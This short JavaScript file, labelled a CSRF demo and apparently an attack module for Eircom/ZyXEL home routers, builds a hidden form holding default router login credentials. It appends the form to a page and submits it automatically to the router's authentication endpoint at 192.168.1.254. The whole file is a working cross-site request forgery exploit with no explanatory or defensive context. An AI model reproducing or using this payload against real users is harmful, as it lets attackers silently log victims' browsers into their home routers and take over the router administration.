//CSRF DEMO
var attack_module = 'eircom-login-csrf.js';

var data = "<form id='csrfform' target='_new' action='http://192.168.1.254/Forms/rpAuth_1' method='POST'><input type='hidden' name='LoginPassword' value='ZyXEL+ZyWALL+Series' /><input type='hidden' name='hiddenPassword' value='067e8d52801e5faf7195b69cfd8e860e' /><input type='hidden' name='Prestige_Login' value='Login' /></form>"


$('body').append(data);
$('#csrfform').submit();
